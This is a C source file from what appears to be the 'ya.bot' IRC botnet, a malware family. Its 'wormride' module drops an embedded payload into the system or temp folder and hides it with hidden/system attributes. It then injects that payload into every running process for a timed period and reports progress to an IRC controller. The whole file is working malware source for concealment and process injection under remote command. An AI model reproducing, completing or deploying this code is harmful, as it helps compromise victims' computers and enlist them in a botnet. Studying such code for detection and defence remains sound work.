/*  ya.bot  */

#include "..\bot.h"

#ifndef NO_INSTALLWORMRIDE
bool install_wormride()
{
	char szFilePath[MAX_PATH], szSystemDirectory[MAX_PATH];

#ifndef NO_DEBUG
		debug_print("Installing wormride, install_wormride()");
#endif	

	if (botinstallasservice)
	{
		if (!GetSystemDirectory(szSystemDirectory, sizeof(szSystemDirectory) - 1))
				return FALSE;
			_snprintf(szFilePath, sizeof(szFilePath) - 1,
					string_filepath,
					szSystemDirectory,
					wormridefilename);
	}
	else
	{
		if (!GetTempPath(sizeof(szFilePath) - 1, szFilePath))
				return FALSE;
			strncat(szFilePath,
					(char *)wormridefilename,
					(sizeof(szFilePath) - strlen(szFilePath)) - 1);
	}
	if (file_exists(szFilePath))
			return FALSE;
	if (!file_extractresource((char *)string_installwormrideresourcename,
				(char *)string_installresourcetype,
				szFilePath)) return FALSE;
		SetFileAttributes(szFilePath,
				FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);
		return TRUE;
}

bool uninstall_wormride()
{
	char szFilePath[MAX_PATH], szSystemDirectory[MAX_PATH];

#ifndef NO_DEBUG
		debug_print("Uninstalling wormride, uninstall_wormride()");
#endif	

	if (botinstallasservice)
	{
		if (!GetSystemDirectory(szSystemDirectory, sizeof(szSystemDirectory) - 1))
				return FALSE;
			_snprintf(szFilePath, sizeof(szFilePath) - 1,
					string_filepath,
					szSystemDirectory,
					wormridefilename);
	}
	else
	{
		if (!GetTempPath(sizeof(szFilePath) - 1, szFilePath))
				return FALSE;
			strncat(szFilePath,
					(char *)wormridefilename,
					(sizeof(szFilePath) - strlen(szFilePath)) - 1);
	}
		SetFileAttributes(szFilePath, FILE_ATTRIBUTE_NORMAL);
	if (!file_delete(szFilePath))
			return FALSE;	
		return TRUE;
}

DWORD WINAPI wormride_main(LPVOID param)
{
	char szFilePath[MAX_PATH], szSystemDirectory[MAX_PATH];
	DWORD dwProcesses, dwTime;
	SWormRide s_wr = *((SWormRide *)param);

#ifndef NO_DEBUG
		debug_print("Starting wormride main thread, wormride_mainn()");
#endif

	if (botinstallasservice)
	{
		if (!GetSystemDirectory(szSystemDirectory, sizeof(szSystemDirectory) - 1))
				return FALSE;
			_snprintf(szFilePath, sizeof(szFilePath) - 1,
					string_filepath,
					szSystemDirectory,
					wormridefilename);
	}
	else
	{
		if (!GetTempPath(sizeof(szFilePath) - 1, szFilePath))
				return FALSE;
			strncat(szFilePath,
					(char *)wormridefilename,
					(sizeof(szFilePath) - strlen(szFilePath)) - 1);
	}
		dwProcesses = inject_processesloadall(szFilePath);
	if (!dwProcesses)
	{
		if ((!s_wr.m_bSilent) && (s_wr.m_bVerbose))
				irc_message(s_wr.m_bsock, s_wr.m_szAction, s_wr.m_szDestination,
						(char *)string_wormridefailed,
						CBLUE, string_replywormride, CEND, string_replydotbot);
			thread_remove(THREAD_WORMRIDE);
			return 0;
	}
	if (!s_wr.m_bSilent)
			irc_message(s_wr.m_bsock, s_wr.m_szAction, s_wr.m_szDestination,
					(char *)string_wormridestarted,
					CGREEN, string_replywormride, CEND, string_replydotbot,
					CBLUE, CEND, szFilePath,
					CBLUE, CEND, dwProcesses,
					CBLUE, CEND, s_wr.m_dwTime);
		dwTime = GetTickCount();
	while (TRUE)
	{
			Sleep(10);
		if ((GetTickCount() - dwTime) >= (s_wr.m_dwTime * 60000))
				break;
	}
		dwProcesses = inject_processesunloadall(WORMRIDE_BASEADDRESS);
	if ((!s_wr.m_bSilent) && (s_wr.m_bVerbose))
			irc_message(s_wr.m_bsock, s_wr.m_szAction, s_wr.m_szDestination,
					(char *)string_wormridefinished,
					CBLUE, string_replywormride, CEND, string_replydotbot,
					CBLUE, CEND, (GetTickCount() - dwTime) / 60000,
					CBLUE, CEND, szFilePath,
					CBLUE, CEND, dwProcesses);
		thread_remove(THREAD_WORMRIDE);
		return 0;
}
#endif